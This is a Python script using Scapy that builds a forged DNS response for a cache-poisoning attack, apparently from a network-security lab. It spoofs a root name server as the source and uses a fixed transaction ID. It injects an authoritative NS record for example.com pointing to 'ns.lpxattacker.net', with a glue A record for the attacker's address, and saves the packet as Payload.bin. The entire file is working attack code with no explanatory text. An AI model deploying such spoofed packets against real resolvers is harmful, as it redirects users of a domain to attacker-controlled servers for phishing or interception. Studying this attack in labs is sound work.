#!/usr/bin/env python3 
from scapy.all import * 
# Construct the DNS header and payload 

user		="172.17.0.2"
DNS_server	="172.17.0.3"
attacker	="172.17.0.4"
attacker2	="172.17.0.5"
attacker3	="172.17.0.1"
host		="192.168.62.19"

higher_DNS_Server="198.41.0.4"
higher_DNS_ServerA="198.41.0.4"
higher_DNS_ServerB="128.9.0.107"
higher_DNS_ServerC="192.33.4.12"
higher_DNS_ServerD="128.8.10.90"
higher_DNS_ServerE="192.203.230.10"
higher_DNS_ServerF="192.5.5.241"
higher_DNS_ServerG="192.112.36.4"
higher_DNS_ServerH="128.63.2.53"
higher_DNS_ServerI="192.36.148.17"
higher_DNS_ServerJ="192.58.128.30"
higher_DNS_ServerK="193.0.14.129"
higher_DNS_ServerL="198.32.64.12"
higher_DNS_ServerM="202.12.27.33"


NS_rdata='ns.lpxattacker.net'
name = 'twysw.example.com'
base_name='example.com'


Qdsec = DNSQR(qname=name) 


Anssec1 = DNSRR(rrname=name, type='A', rdata=attacker3, ttl=259200)
Addsec1  = DNSRR(rrname=NS_rdata, type='A', rdata=attacker3, ttl=259200)
NSsec1 = DNSRR(rrname=base_name, type='NS',ttl=259200, rdata=NS_rdata)

dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1, 
qdcount=1, ancount=1, nscount=1, arcount=1,
qd=Qdsec, an=Anssec1,ns=NSsec1,ar=Addsec1) 

# Construct the IP, UDP headers, and the entire packet 
ip = IP(dst=DNS_server, src=higher_DNS_ServerM, chksum=0) 
udp = UDP(dport=33333, sport=53, chksum=0) 
pkt = ip/udp/dns 
# Save the packet to a file 


with open('Payload.bin', 'wb') as f: 
    f.write(bytes(pkt))
    
#send(pkt_q)
